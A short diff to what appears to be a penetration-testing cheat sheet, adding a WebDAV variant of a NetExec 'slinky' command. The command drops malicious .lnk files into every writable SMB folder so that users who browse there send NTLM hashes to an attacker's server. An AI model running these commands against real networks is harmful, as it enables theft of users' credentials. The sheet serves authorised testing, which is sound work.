@@ -293,7 +293,16 @@ in every writable folder on the target server
 CLEANUP=true
 
 ```bash
-nxc smb <ip> -u <user> -p <password> -M slinky -o NAME=<file_name> SERVER=<local_ip>
+nxc smb <ip> -u <user> -p <password> -M slinky -o NAME=<file_name> SERVER=<local_ip_or_no_real_name>
+```
+
+## smb - drop an malicious .lnk file WEBDAV (hash farming)
+#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/COERCE-FILE
+in every writable folder on the target server 
+CLEANUP=true
+
+```bash
+nxc smb <ip> -u <user> -p <password> -M slinky -o NAME=<file_name> SERVER=<local_ip_or_no_real_name>@<PORT>
 ```
  
 
